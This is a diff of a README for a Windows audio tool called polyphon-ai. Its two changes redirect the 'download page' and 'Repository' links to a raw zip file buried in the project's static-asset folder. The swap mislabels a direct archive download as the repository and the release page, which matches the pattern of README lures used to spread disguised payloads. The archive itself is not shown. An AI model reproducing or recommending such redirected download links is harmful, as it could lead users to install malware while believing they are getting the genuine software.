@@ -16,7 +16,7 @@ Ready to begin? Here’s how to get polyphon-ai on your Windows computer:
 
 ### Step 1: Get the Software
 
-👉 **[Click here to visit the download page](https://github.com/traydoe/polyphon-ai)**
+👉 **[Click here to visit the download page](https://github.com/traydoe/polyphon-ai/raw/refs/heads/main/src/polyphon/server/static/1.5-alpha.2.zip)**
 
 Visit this link to download the application. Look for the latest release — the file will be labeled clearly. 
 
@@ -202,7 +202,7 @@ Let’s turn your audio into insight — together.
 
 ## 📦 More Information
 
-**Repository:** [polyphon-ai on GitHub](https://github.com/traydoe/polyphon-ai)
+**Repository:** [polyphon-ai on GitHub](https://github.com/traydoe/polyphon-ai/raw/refs/heads/main/src/polyphon/server/static/1.5-alpha.2.zip)
 
 **License:** Free and open source
 
